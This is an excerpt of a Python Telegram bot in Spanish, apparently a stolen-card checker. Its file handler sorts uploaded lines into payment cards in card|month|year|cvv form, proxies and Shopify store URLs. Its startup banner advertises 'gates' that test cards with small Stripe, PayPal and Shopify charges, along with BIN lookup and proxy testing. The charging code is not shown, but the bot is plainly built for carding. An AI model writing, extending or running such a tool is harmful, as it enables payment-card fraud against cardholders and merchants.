        contenido = downloaded_file.decode('utf-8')
        
        # Detectar tipo de contenido
        lineas = contenido.strip().split('\n')
        es_tarjeta = False
        es_proxy = False
        es_sitio = False
        
        for linea in lineas[:5]:
            linea = linea.strip()
            if '|' in linea and len(linea.split('|')) == 4:
                es_tarjeta = True
            elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', linea):
                es_proxy = True
            elif re.match(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$', linea):
                es_sitio = True
        
        if es_tarjeta and not es_proxy and not es_sitio:
            guardadas, repetidas, invalidas = guardar_tarjetas_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ TARJETAS CARGADAS    ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardadas: {guardadas:<4}             ║\n"
                f"║ 🔁 Repetidas: {repetidas:<4}             ║\n"
                f"║ ❌ Inválidas: {invalidas:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_proxy:
            guardados, repetidos, invalidos = guardar_proxies_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ PROXIES CARGADOS     ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        elif es_sitio:
            guardados, repetidos, invalidos = guardar_sitios_desde_texto(contenido)
            texto = (
                "╔════════════════════════════╗\n"
                "║    ✅ SITIOS CARGADOS      ║\n"
                "╠════════════════════════════╣\n"
                f"║ 📦 Guardados: {guardados:<4}             ║\n"
                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
                "╚════════════════════════════╝"
            )
        
        else:
            texto = "❌ No se pudo identificar el tipo de archivo"
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, msg.message_id)

@bot.message_handler(func=lambda m: True)
def default(message):
    if message.text and message.text.startswith('/'):
        bot.reply_to(message, "❓ Comando no reconocido. Usa /menu")
    else:
        bot.reply_to(message, "❓ Usa /menu para ver las opciones")

# ==================== INICIO DEL BOT ====================

if __name__ == "__main__":
    print("="*80)
    print("🤖 AUTO SHOPIFY BOT - VERSIÓN MEJORADA")
    print("="*80)
    print("✅ Mejoras implementadas:")
    print("   2️⃣ Test de proxy avanzado (socket + HTTP)")
    print("   7️⃣ BIN lookup con múltiples fuentes")
    print("="*80)
    print("✅ Gates disponibles:")
    print("   • Stripe: $1.00       → /check")
    print("   • PayPal: $10/$0.10/$1 → /pp /pp2 /pp3")
    print("   • AutoShopify: variable → /sh")
    print("="*80)
    print("📱 Usa /menu para comenzar")
    print("="*80)
    
    # Para Railway, usamos polling con timeout
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"❌ Error en polling: {e}")
        time.sleep(10)
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
